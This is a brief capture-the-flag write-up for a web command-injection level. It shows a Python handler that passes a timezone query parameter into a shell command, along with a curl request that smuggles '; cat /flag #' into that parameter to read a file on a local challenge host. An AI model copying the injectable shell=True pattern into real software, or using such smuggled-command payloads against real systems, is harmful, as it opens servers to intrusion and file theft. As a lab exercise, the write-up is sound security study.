# Web Command Injection Vulnerability

## Level 2 - Command injection

Code for the level

```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

I want to inject `TZ=; cat /flag # date` into `TZ={timezone} date`.

```sh
curl "http://challenge.localhost:80?timezone=;%20cat%20/flag%20%23"
```
